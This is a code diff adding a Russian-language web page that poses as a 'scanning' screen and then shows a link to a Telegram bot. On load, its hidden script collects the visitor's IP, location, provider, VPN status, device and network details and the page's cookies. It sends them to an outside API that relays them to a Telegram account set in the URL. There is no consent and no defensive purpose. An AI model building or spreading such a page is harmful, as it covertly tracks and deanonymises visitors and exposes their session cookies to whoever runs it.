@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #0a0a0a;
+            height: 100vh;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        .scan {
+            position: absolute;
+            width: 100%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #00ffaa, transparent);
+            animation: scan 3s ease-in-out infinite;
+        }
+        @keyframes scan {
+            0% { top: 0%; opacity: 0; }
+            20% { opacity: 1; }
+            80% { opacity: 1; }
+            100% { top: 100%; opacity: 0; }
+        }
+        .center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+        }
+        .loader {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 25px;
+            position: relative;
+        }
+        .loader-inner {
+            width: 100%;
+            height: 100%;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-top: 2px solid #00ffaa;
+            border-radius: 50%;
+            animation: spin 1.2s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .text {
+            color: #aaa;
+            font-size: 14px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+        .success {
+            display: none;
+        }
+        .caught {
+            color: #fff;
+            font-size: 32px;
+            font-weight: 300;
+            margin-bottom: 40px;
+            letter-spacing: 3px;
+        }
+        .btn {
+            display: inline-block;
+            padding: 12px 30px;
+            background: transparent;
+            color: #00ffaa;
+            text-decoration: none;
+            border: 1px solid #00ffaa;
+            font-size: 14px;
+            letter-spacing: 2px;
+            transition: all 0.3s;
+        }
+        .btn:hover {
+            background: rgba(0, 255, 170, 0.1);
+        }
+    </style>
+</head>
+<body>
+    <div class="scan"></div>
+    <div class="center">
+        <div id="loading">
+            <div class="loader">
+                <div class="loader-inner"></div>
+            </div>
+            <div class="text">сканирование</div>
+        </div>
+        <div id="success" class="success">
+            <div class="caught">✓</div>
+            <a href="https://t.me/faidiappsbot" target="_blank" class="btn">@faidiappsbot</a>
+        </div>
+    </div>
+    <script>
+        async function collectInfo() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const telegramId = urlParams.get('id') || '6785759216';
+            
+            let ip = 'Неизвестно';
+            let locationData = {};
+            
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+                
+                const locRes = await fetch('https://ipapi.co/json/');
+                locationData = await locRes.json();
+            } catch (e) {
+                console.error('Ошибка получения данных:', e);
+            }
+            
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language || navigator.userLanguage;
+            const cookiesEnabled = navigator.cookieEnabled;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const now = new Date();
+            
+            const formattedTime = now.toLocaleString('ru-RU', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            
+            const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
+            let ipValid = false;
+            
+            if (ipv4Regex.test(ip)) {
+                const parts = ip.split('.');
+                let valid = true;
+                for (let part of parts) {
+                    const num = parseInt(part);
+                    if (num < 0 || num > 255 || isNaN(num)) {
+                        valid = false;
+                        break;
+                    }
+                }
+                ipValid = valid;
+            }
+            
+            const connection = navigator.connection || {};
+            const netType = connection.effectiveType || 'Неизвестно';
+            const downlink = connection.downlink ? `${connection.downlink} Mbps` : 'Неизвестно';
+            const rtt = connection.rtt ? `${connection.rtt}ms` : 'Неизвестно';
+            
+            let vpnCheck = 'Неизвестно';
+            try {
+                if (ip !== 'Неизвестно') {
+                    const vpnRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                    const vpnData = await vpnRes.json();
+                    vpnCheck = vpnData.proxy || vpnData.vpn ? 'Да' : 'Нет';
+                }
+            } catch (e) {}
+            
+            const cookies = document.cookie;
+            const hasHistory = window.history.length > 0;
+            const historyInfo = hasHistory ? 'Доступна' : 'Не доступна';
+            
+            const message = `📡 <b>НОВЫЕ ДАННЫЕ</b>
+
+📍 <b>Геолокация:</b>
+├ IP: <code>${ip}</code>
+├ Город: ${locationData.city || 'Не определено'}
+├ Страна: ${locationData.country_name || 'Не определено'}
+└ Провайдер: ${locationData.org || 'Не определено'}
+
+🔍 <b>Детали подключения:</b>
+├ Тип сети: ${netType}
+├ Скорость: ${downlink}
+├ Время отклика: ${rtt}
+└ VPN/Прокси: ${vpnCheck}
+
+🖥️ <b>Система:</b>
+├ User-agent: <code>${userAgent}</code>
+├ Платформа: ${platform}
+├ Язык: ${language}
+├ Куки: ${cookiesEnabled ? 'Да' : 'Нет'}
+├ История: ${historyInfo}
+└ Разрешение: ${screenRes}
+
+⚡ <b>Проверки:</b>
+├ IP валидный: ${ipValid ? '✅ Да' : '❌ Нет'}
+├ Часовой пояс: ${timezone}
+└ Время: ${formattedTime}
+
+🔗 <b>Cookie:</b>
+<code>${cookies || 'Нет данных'}</code>
+
+<b>Вечная ссылка:</b> FaidikSearch.xyz
+
+<i>#${Date.now()}</i>`;
+            
+            try {
+                await fetch('https://fdl-api-2.vercel.app/api/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        text: message,
+                        id: telegramId,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('success').style.display = 'block';
+                }, 2000);
+                
+            } catch (error) {
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('success').style.display = 'block';
+                }, 2000);
+            }
+        }
+        
+        window.onload = collectInfo;
+    </script>
+</body>
+</html>
